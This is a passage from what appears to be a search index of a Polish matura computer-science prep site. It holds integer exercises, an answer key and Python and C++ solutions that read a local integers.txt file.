Fryderyka, poniewa\u017c \\(8^1 + 9^2 = 89\\).</p> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>6\n8\n9\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/#zadanie-24","title":"Zadanie 24","text":"<p>Liczb\u0105 Keitha nazywamy \\(n\\)-cyfrow\u0105 liczb\u0119 ca\u0142kowit\u0105 \\(k\\), kt\u00f3ra stanowi element ci\u0105gu liczbowego, w kt\u00f3ym pierwsze \\(n\\) wyraz\u00f3w to cyfry liczby \\(k\\), a ka\u017cdy kolejny wyraz to suma poprzedzaj\u0105cych go \\(n\\) wyraz\u00f3w.</p> <p>Dla przyk\u0142adu, liczba \\(197\\) jest liczb\u0105 Keitha, poniewa\u017c tworzy ci\u0105g \\(1, 9, 7, 17, 33, 57, 107, 197\\).</p> <p>Podaj wszystkie liczby z pliku, kt\u00f3re s\u0105 liczbami Keitha.</p> <p>Wynik dla pliku integers_test.txt:</p> <pre><code>6\n8\n9\n28\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/","title":"Odpowiedzi","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-1","title":"Zadanie 1","text":"<pre><code>Minimum: 6 Pozycja: 1\nMaksimum: 200 Pozycja: 100\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-2","title":"Zadanie 2","text":"<pre><code>Suma: 10036\n\u015arednia: 100.36\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-3","title":"Zadanie 3","text":"<pre><code>50\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-4","title":"Zadanie 4","text":"<pre><code>Minimum parzyste: 6\nMaksimum parzyste: 200\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-5","title":"Zadanie 5","text":"<pre><code>8\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-6","title":"Zadanie 6","text":"<pre><code>Maksimum NWD: 5\nMinimum NWD: 1\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-7","title":"Zadanie 7","text":"<pre><code>NWW: 360\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-8","title":"Zadanie 8","text":"<pre><code>23\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-9","title":"Zadanie 9","text":"<pre><code>Minimalna suma cyfr: 1 Liczba: 100\nMaksymalna suma cyfr: 18 Liczba: 99\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-10","title":"Zadanie 10","text":"<pre><code>Para o najwi\u0119kszej sumie: (197, 200)\nPara o najmniejszej sumie: (8, 9)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-11","title":"Zadanie 11","text":"<pre><code>6\n28\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-12","title":"Zadanie 12","text":"<pre><code>101.0\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-13","title":"Zadanie 13","text":"<pre><code>Najpopularniejsza liczba: 6\nLiczba wyst\u0105pie\u0144: 1\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-14","title":"Zadanie 14","text":"<pre><code>2\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-15","title":"Zadanie 15","text":"<pre><code>Wi\u0119cej zer: 26\nMniej zer: 55\nTyle samo: 19\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-16","title":"Zadanie 16","text":"<pre><code>30\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-17","title":"Zadanie 17","text":"<pre><code>17\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-18","title":"Zadanie 18","text":"<pre><code>9\n36\n49\n100\n144\n169\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-19","title":"Zadanie 19","text":"<pre><code>89397\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-20","title":"Zadanie 20","text":"<pre><code>6\n15\n21\n31\n35\n36\n40\n45\n46\n50\n51\n55\n56\n60\n61\n65\n70\n75\n76\n85\n86\n90\n100\n106\n110\n115\n120\n125\n126\n130\n135\n145\n146\n151\n155\n156\n160\n166\n171\n181\n195\n200\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-21","title":"Zadanie 21","text":"<pre><code>9\n45\n55\n99\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-22","title":"Zadanie 22","text":"<pre><code>6 110\n8 1000\n24 11000\n28 11100\n32 100000\n56 111000\n60 111100\n62 111110\n112 1110000\n120 1111000\n126 1111110\n192 11000000\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-23","title":"Zadanie 23","text":"<pre><code>6\n8\n9\n89\n135\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/answers/#zadanie-24","title":"Zadanie 24","text":"<pre><code>6\n8\n9\n28\n47\n61\n75\n197\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/","title":"Rozwi\u0105zania - Python","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-1","title":"Zadanie 1","text":"PythonC++ <pre><code>with open(\"integers.txt\") as file:\n    numbers = list(map(int, file.read().split()))\n\nmin_val = min(numbers)\nmax_val = max(numbers)\n\nprint(\"Minimum:\", min_val, \"Pozycja:\", numbers.index(min_val) + 1)\nprint(\"Maksimum:\", max_val, \"Pozycja:\", numbers.index(max_val) + 1)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"integers.txt\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    auto min_val = *min_element(numbers.begin(), numbers.end());\n    auto max_val = *max_element(numbers.begin(), numbers.end());\n\n    cout &lt;&lt; \"Minimum: \" &lt;&lt; min_val &lt;&lt; \" Pozycja: \" &lt;&lt; (find(numbers.begin(), numbers.end(), min_val) - numbers.begin() + 1) &lt;&lt; endl;\n    cout &lt;&lt; \"Maksimum: \" &lt;&lt; max_val &lt;&lt; \" Pozycja: \" &lt;&lt; (find(numbers.begin(), numbers.end(), max_val) - numbers.begin() + 1) &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-2","title":"Zadanie 2","text":"PythonC++ <pre><code>with open(\"integers.txt\") as file:\n    numbers = list(map(int, file.read().split()))\n\nsum_val = sum(numbers)\navg_val = sum_val / len(numbers)\n\nprint(\"Suma:\", sum_val)\nprint(f\"\u015arednia: {avg_val:.2f}\")\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n#include &lt;numeric&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"integers.txt\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    int sum_val = accumulate(numbers.begin(), numbers.end(), 0);\n    double avg_val = static_cast&lt;double&gt;(sum_val) / numbers.size();\n\n    cout &lt;&lt; \"Suma: \" &lt;&lt; sum_val &lt;&lt; endl;\n    cout &lt;&lt; \"Srednia: \" &lt;&lt; fixed &lt;&lt; setprecision(2) &lt;&lt; avg_val &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-3","title":"Zadanie 3","text":"<p>=== \"Python</p> <pre><code>```python linenums=\"1\"\nwith open(\"integers.txt\") as file:\n    numbers = list(map(int, file.read().split()))\n\ncounter = 0\n\nfor num in numbers:\n    if num % 2 == 0:\n        counter += 1\n\nprint(counter)\n```\n</code></pre> C++ <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"integers.txt\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    int counter = 0;\n\n    for (int num : numbers) {\n        if (num % 2 == 0) {\n            counter += 1;\n        }\n    }\n\n    cout &lt;&lt; counter &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-4","title":"Zadanie 4","text":"PythonC++ <pre><code>with open(\"integers.txt\") as file:\n    numbers = list(map(int, file.read().split()))\n\neven = [num for num in numbers if num % 2 == 0]\n\nprint(\"Minimum parzyste:\", min(even))\nprint(\"Maksimum parzyste:\", max(even))\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"integers.txt\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    vector&lt;int&gt; even;\n    for (int num : numbers) {\n        if (num % 2 == 0) {\n            even.push_back(num);\n        }\n    }\n\n    cout &lt;&lt; \"Minimum parzyste: \" &lt;&lt; *min_element(even.begin(), even.end()) &lt;&lt; endl;\n    cout &lt;&lt; \"Maksimum parzyste: \" &lt;&lt; *max_element(even.begin(), even.end()) &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-5","title":"Zadanie 5","text":"PythonC++ <pre><code>with open(\"integers.txt\") as file:\n    numbers = list(map(int, file.read().split()))\n\ncounter = 0\n\nfor num in numbers:\n    if num % 3 == 0 and num % 5 == 0:\n        counter += 1\n\nprint(counter)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"integers.txt\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    int counter = 0;\n\n    for (int num : numbers) {\n        if (num % 3 == 0 &amp;&amp; num % 5 == 0) {\n            counter += 1;\n        }\n    }\n\n    cout &lt;&lt; counter &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-6","title":"Zadanie 6","text":"PythonC++ <pre><code>from math import gcd\n\nwith open(\"integers.txt\") as file:\n    numbers = list(map(int, file.read().split()))\n\ngcd_list = [gcd(numbers[i - 1], numbers[i]) for i in range(1, len(numbers))]\n\nprint(\"Maksimum NWD:\", max(gcd_list))\nprint(\"Minimum NWD:\", min(gcd_list))\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n#include &lt;numeric&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nint gcd(int a, int b) {\n    while (b != 0) {\n        int temp = b;\n        b = a % b;\n        a = temp;\n    }\n    return a;\n}\n\nint main() {\n    ifstream file(\"integers.txt\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    vector&lt;int&gt; gcd_list;\n    for (size_t i = 1; i &lt; numbers.size(); ++i) {\n        gcd_list.push_back(gcd(numbers[i - 1], numbers[i]));\n    }\n\n    cout &lt;&lt; \"Maksimum NWD: \" &lt;&lt; *max_element(gcd_list.begin(), gcd_list.end()) &lt;&lt; endl;\n    cout &lt;&lt; \"Minimum NWD: \" &lt;&lt; *min_element(gcd_list.begin(), gcd_list.end()) &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-7","title":"Zadanie 7","text":"PythonC++ <pre><code>from math import gcd\n\nwith open(\"integers.txt\") as file:\n    numbers = list(map(int, file.read().split()))\n\ncurrent_lcm = 1\n\nfor i in range(1, len(numbers)):\n    if numbers[i] &lt; 20:\n        current_lcm = (current_lcm * numbers[i]) // gcd(current_lcm, numbers[i])\n\nprint(\"NWW:\", current_lcm)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n#include &lt;numeric&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"integers.txt\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    int current_lcm = 1;\n\n    for (size_t i = 1; i &lt; numbers.size(); ++i) {\n        if (numbers[i] &lt; 20) {\n            current_lcm = lcm(current_lcm, numbers[i]);\n        }\n    }\n\n    cout &lt;&lt; \"NWW: \" &lt;&lt; current_lcm &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-8","title":"Zadanie 8","text":"PythonC++ <pre><code>def is_prime(num):\n    if num &lt;= 1:\n        return False\n\n    i = 2\n    while i * i &lt;= num:\n        if num % i == 0:\n            return False\n\n        i += 1\n\n    return True\n\nwith open(\"integers.txt\") as file:\n    numbers = list(map(int, file.read().split()))\n\ncounter = 0\n\nfor num in numbers:\n    if is_prime(num):\n        counter += 1\n\nprint(counter)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nbool is_prime(int num) {\n    if (num &lt;= 1) {\n        return false;\n    }\n    for (int i = 2; i * i &lt;= num; ++i) {\n        if (num % i == 0) {\n            return false;\n        }\n    }\n    return true;\n}\n\nint main() {\n    ifstream file(\"integers.txt\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    int counter = 0;\n\n    for (int num : numbers) {\n        if (is_prime(num)) {\n            counter += 1;\n        }\n    }\n\n    cout &lt;&lt; counter &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-9","title":"Zadanie 9","text":"PythonC++ <pre><code>with open(\"integers.txt\") as file:\n    numbers = list(map(int, file.read().split()))\n\nnumbers_sum = []\n\nfor num in numbers:\n    digit_sum = 0\n    while num &gt; 0:\n        digit_sum += num % 10\n        num //= 10\n\n    numbers_sum.append(digit_sum)\n\nmin_sum = min(numbers_sum)\nmax_sum = max(numbers_sum)\n\nprint(\"Minimalna suma cyfr:\", min_sum, \"Liczba:\", numbers[numbers_sum.index(min_sum)])\nprint(\"Maksymalna suma cyfr:\", max_sum, \"Liczba:\", numbers[numbers_sum.index(max_sum)])\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nint digit_sum(int num) {\n    int sum = 0;\n    while (num &gt; 0) {\n        sum += num % 10;\n        num /= 10;\n    }\n    return sum;\n}\n\nint main() {\n    ifstream file(\"integers.txt\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    vector&lt;int&gt; numbers_sum;\n    for (int num : numbers) {\n        numbers_sum.push_back(digit_sum(num));\n    }\n\n    int min_sum = *min_element(numbers_sum.begin(), numbers_sum.end());\n    int max_sum = *max_element(numbers_sum.begin(), numbers_sum.end());\n\n    cout &lt;&lt; \"Minimalna suma cyfr: \" &lt;&lt; min_sum &lt;&lt; \" Liczba: \" &lt;&lt; numbers[distance(numbers_sum.begin(), find(numbers_sum.begin(), numbers_sum.end(), min_sum))] &lt;&lt; endl;\n    cout &lt;&lt; \"Maksymalna suma cyfr: \" &lt;&lt; max_sum &lt;&lt; \" Liczba: \" &lt;&lt; numbers[distance(numbers_sum.begin(), find(numbers_sum.begin(), numbers_sum.end(), max_sum))] &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-10","title":"Zadanie 10","text":"PythonC++ <pre><code>from math import gcd\n\nwith open(\"integers.txt\") as file:\n    numbers = list(map(int, file.read().split()))\n\nmin_pair = (0,0)\nmax_pair = (0,0)\nmin_sum = 500\nmax_sum = 0\n\nfor i in range(len(numbers)):\n    for j in range(i + 1, len(numbers)):\n        if gcd(numbers[i], numbers[j]) == 1:\n            sum_pair = numbers[i] + numbers[j]\n            if sum_pair &lt; min_sum:\n                min_pair = (numbers[i], numbers[j])\n                min_sum = sum_pair\n            elif sum_pair &gt; max_sum:\n                max_pair = (numbers[i], numbers[j])\n                max_sum = sum_pair\n\nprint(\"Para o najwi\u0119kszej sumie:\", max_pair)\nprint(\"Para o najmniejszej sumie:\", min_pair)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n#include &lt;numeric&gt;\n\nusing namespace std;\n\nint gcd(int a, int b) {\n    while (b != 0) {\n        int temp = b;\n        b = a % b;\n        a = temp;\n    }\n    return a;\n}\n\nint main() {\n    ifstream file(\"integers.txt\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    pair&lt;int, int&gt; min_pair = {0, 0};\n    pair&lt;int, int&gt; max_pair = {0, 0};\n    int min_sum = 500;\n    int max_sum = 0;\n\n    for (size_t i = 0; i &lt; numbers.size(); ++i) {\n        for (size_t j = i + 1; j &lt; numbers.size(); ++j) {\n            if (gcd(numbers[i], numbers[j]) == 1) {\n                int sum_pair = numbers[i] + numbers[j];\n                if (sum_pair &lt; min_sum) {\n                    min_pair = {numbers[i], numbers[j]};\n                    min_sum = sum_pair;\n                } else if (sum_pair &gt; max_sum) {\n                    max_pair = {numbers[i], numbers[j]};\n                    max_sum = sum_pair;\n                }\n            }\n        }\n    }\n\n    cout &lt;&lt; \"Para o najwi\u0119kszej sumie: (\" &lt;&lt; max_pair.first &lt;&lt; \", \" &lt;&lt; max_pair.second &lt;&lt; \")\" &lt;&lt; endl;\n    cout &lt;&lt; \"Para o najmniejszej sumie: (\" &lt;&lt; min_pair.first &lt;&lt; \", \" &lt;&lt; min_pair.second &lt;&lt; \")\" &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-11","title":"Zadanie 11","text":"PythonC++ <pre><code>def is_perfect(num):\n    factors_sum = 1\n    i = 2\n    while i * i &lt;= num:\n        if num % i == 0:\n            factors_sum += i\n            if num // i != i:\n                factors_sum += num // i\n        i += 1\n\n    return factors_sum == num\n\nwith open(\"integers.txt\") as file:\n    numbers = list(map(int, file.read().split()))\n\nfor num in numbers:\n    if is_perfect(num):\n        print(num)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nbool is_perfect(int num) {\n    int factors_sum = 1;\n    for (int i = 2; i * i &lt;= num; ++i) {\n        if (num % i == 0) {\n            factors_sum += i;\n            if (num / i != i) {\n                factors_sum += num / i;\n            }\n        }\n    }\n    return factors_sum == num;\n}\n\nint main() {\n    ifstream file(\"integers.txt\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    for (int num : numbers) {\n        if (is_perfect(num)) {\n            cout &lt;&lt; num &lt;&lt; endl;\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-12","title":"Zadanie 12","text":"PythonC++ <pre><code>from statistics import median\n\nwith open(\"integers.txt\") as file:\n    numbers = list(map(int, file.read().split()))\n\nprint(median(numbers))\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"integers.txt\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    sort(numbers.begin(), numbers.end());\n\n    double median;\n    size_t size = numbers.size();\n    if (size % 2 == 0) {\n        median = (numbers[size / 2 - 1] + numbers[size / 2]) / 2.0;\n    } else {\n        median = numbers[size / 2];\n    }\n\n    cout &lt;&lt; median &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-13","title":"Zadanie 13","text":"PythonC++ <pre><code>from collections import Counter\n\nwith open(\"integers.txt\") as file:\n    numbers = list(map(int, file.read().split()))\n\ncounters = Counter(sorted(numbers))\nmost_common = counters.most_common(1)[0]\n\nprint(\"Najpopularniejsza liczba:\", most_common[0])\nprint(\"Liczba wyst\u0105pie\u0144:\", most_common[1])\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n#include &lt;algorithm&gt;\n#include &lt;unordered_map&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"integers.txt\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    unordered_map&lt;int, int&gt; counters;\n    for (int num : numbers) {\n        counters[num]++;\n    }\n\n    auto most_common = max_element(counters.begin(), counters.end(), [](const pair&lt;int, int&gt;&amp; a, const pair&lt;int, int&gt;&amp; b) {\n        return a.second &lt; b.second;\n    });\n\n    cout &lt;&lt; \"Najpopularniejsza liczba: \" &lt;&lt; most_common-&gt;first &lt;&lt; endl;\n    cout &lt;&lt; \"Liczba wyst\u0105pie\u0144: \" &lt;&lt; most_common-&gt;second &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-14","title":"Zadanie 14","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#wersja-1","title":"Wersja 1","text":"<p>Sprawdzenie, czy liczba jest pot\u0119g\u0105 dw\u00f3jki, mo\u017cemy wykona\u0107 za pomoc\u0105 wielokrotnego dzielenia liczby przez dwa. Je\u017celi w trakcie dzielenia natrafimy na liczb\u0119 nieparzyst\u0105, to liczba nie jest pot\u0119g\u0105 dw\u00f3jki. Je\u017celi natomiast dotrzemy do warto\u015bci 1, to liczba jest pot\u0119g\u0105 dw\u00f3jki.</p> PythonC++ <pre><code>def is_power_of_two(num):\n    while num &gt; 1:\n        if num % 2 != 0:\n            return False\n\n        num //= 2\n\n    return True\n</code></pre> <pre><code>bool is_power_of_two(int num) {\n    while (num &gt; 1) {\n        if (num % 2 != 0) {\n            return false;\n        }\n        num /= 2;\n    }\n    return true;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#wersja-2","title":"Wersja 2","text":"<p>Sprawdzenie, czy liczba jest pot\u0119g\u0105 dw\u00f3jki, mo\u017cemy tak\u017ce oprze\u0107 na zapisie binarnym liczby. Je\u017celi liczba jest pot\u0119g\u0105 dw\u00f3jki, to w jej zapisie binarnym znajduje si\u0119 dok\u0142adnie jedna jedynka. W takim razie, je\u017celi wykonamy operacj\u0119 bitow\u0105 AND na sprawdzanej liczbie i jej warto\u015bci pomniejszonej o jeden (zak\u0142adaj\u0105c, \u017ce liczba jest wi\u0119ksza od zera), to dostaniemy jako wynik zero wtedy i tylko wtedy, gdy sprawdzana liczba jest pot\u0119g\u0105 dw\u00f3jki..</p> PythonC++ <pre><code>def is_power_of_two(num):\n    return num &gt; 0 and num &amp; (num - 1) == 0\n</code></pre> <pre><code>bool is_power_of_two(int num) {\n    return num &gt; 0 &amp;&amp; (num &amp; (num - 1)) == 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#rozwiazanie","title":"Rozwi\u0105zanie","text":"PythonC++ <pre><code>def is_power_of_two(num):\n    return num &gt; 0 and num &amp; (num - 1) == 0\n\n\nwith open(\"integers.txt\") as file:\n    numbers = list(map(int, file.read().split()))\n\ncounter = 0\n\nfor num in numbers:\n    if is_power_of_two(num):\n        counter += 1\n\nprint(counter)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nbool is_power_of_two(int num) {\n    return num &gt; 0 &amp;&amp; (num &amp; (num - 1)) == 0;\n}\n\nint main() {\n    ifstream file(\"integers.txt\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    int counter = 0;\n\n    for (int num : numbers) {\n        if (is_power_of_two(num)) {\n            counter += 1;\n        }\n    }\n\n    cout &lt;&lt; counter &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-15","title":"Zadanie 15","text":"PythonC++ <pre><code>with open(\"integers.txt\") as file:\n    numbers = list(map(int, file.read().split()))\n\nmore_zeros = 0\nmore_ones = 0\nzeros_eq_ones = 0\n\nfor num in numbers:\n    binary = str(bin(num))[2:]\n    zero_count = binary.count(\"0\")\n    one_count = binary.count(\"1\")\n    if zero_count &gt; one_count:\n        more_zeros += 1\n    elif zero_count &lt; one_count:\n        more_ones += 1\n    else:\n        zeros_eq_ones += 1\n\nprint(\"Wi\u0119cej zer:\", more_zeros)\nprint(\"Mniej zer:\", more_ones)\nprint(\"Tyle samo:\", zeros_eq_ones)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n#include &lt;bitset&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"integers.txt\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    int more_zeros = 0;\n    int more_ones = 0;\n    int zeros_eq_ones = 0;\n\n    for (int num : numbers) {\n        bitset&lt;32&gt; binary(num);\n        int zero_count = binary.size() - binary.count();\n        int one_count = binary.count();\n        if (zero_count &gt; one_count) {\n            more_zeros += 1;\n        } else if (zero_count &lt; one_count) {\n            more_ones += 1;\n        } else {\n            zeros_eq_ones += 1;\n        }\n    }\n\n    cout &lt;&lt; \"Wi\u0119cej zer: \" &lt;&lt; more_zeros &lt;&lt; endl;\n    cout &lt;&lt; \"Mniej zer: \" &lt;&lt; more_ones &lt;&lt; endl;\n    cout &lt;&lt; \"Tyle samo: \" &lt;&lt; zeros_eq_ones &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-16","title":"Zadanie 16","text":"PythonC++ <pre><code>def is_prime(num):\n    if num &lt;= 1:\n        return False\n\n    i = 2\n    while i * i &lt;= num:\n        if num % i == 0:\n            return False\n\n        i += 1\n\n    return True\n\nwith open(\"integers.txt\") as file:\n    numbers = list(map(int, file.read().split()))\n\ncounter = 0\n\nfor num in numbers:\n    i = 2\n    while num % i != 0:\n        i += 1\n\n    if is_prime(num // i):\n        counter += 1\n\nprint(counter)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nbool is_prime(int num) {\n    if (num &lt;= 1) {\n        return false;\n    }\n    for (int i = 2; i * i &lt;= num; ++i) {\n        if (num % i == 0) {\n            return false;\n        }\n    }\n    return true;\n}\n\nint main() {\n    ifstream file(\"integers.txt\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    int counter = 0;\n\n    for (int num : numbers) {\n        int i = 2;\n        while (num % i != 0) {\n            i += 1;\n        }\n\n        if (is_prime(num / i)) {\n            counter += 1;\n        }\n    }\n\n    cout &lt;&lt; counter &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/integers/solutions/#zadanie-17","title":"Zadanie 17","text":"PythonC++ <pre><code>with open(file_name) as file:\n    numbers = list(map(int, file.read().split()))\n\nfactorials = [1]\ni = 2\nwhile factorials[-1] &lt;= 200:\n    factorials.append(factorials[-1] * i)\n    i += 1\n\ncounter = 0\n\nfor num in numbers:\n    if num in factorials:\n        counter += 1\n\nprint(counter)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"file_name\");\n    vector&lt;int&gt; numbers;\n    int num;\n\n    while (file &gt;&gt; num) {\n        numbers.push_back(num);\n    }\n\n    vector&lt;int&gt; factorials = {1};\n    int i = 2;\n    while (factorials.back() &lt;= 200) {\n        factorials.push_back(factorials.back() * i);\n        i += 1;\n    }\n\n    int counter = 0;\n\n    for (int num : numbers) {\n        if (find(factorials.begin(), factorials.end(), num) != factorials.end()) {\n            counter += 1;\n        }\n    }\n\n    cout &lt;&lt; counter &lt;&lt; endl;\n\n    return 